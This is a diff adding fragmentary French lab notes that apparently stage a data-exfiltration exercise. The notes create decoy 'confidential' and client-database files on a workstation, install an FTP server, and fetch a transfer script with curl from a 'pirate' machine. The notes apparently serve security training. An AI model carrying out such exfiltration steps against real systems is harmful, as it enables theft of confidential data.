@@ -120,7 +120,22 @@ avec un mot de passe dans la liste des 500 pires mot de passes
 ```
 A8)
 
+- poste de travail
+echo "confidentiel" > draft_iphone30.docx 
+echo "database data" > client_database.sql
+sudo apt-get update -y && apt-get install -y vsftpd
 
+docx=word
+
+
+-  ftp-pirate -> poste :
+curl ftp_transf.sh > ftp_transf.sh
+
+
+
+
+
+- serveur pirate ftp
 
 
 
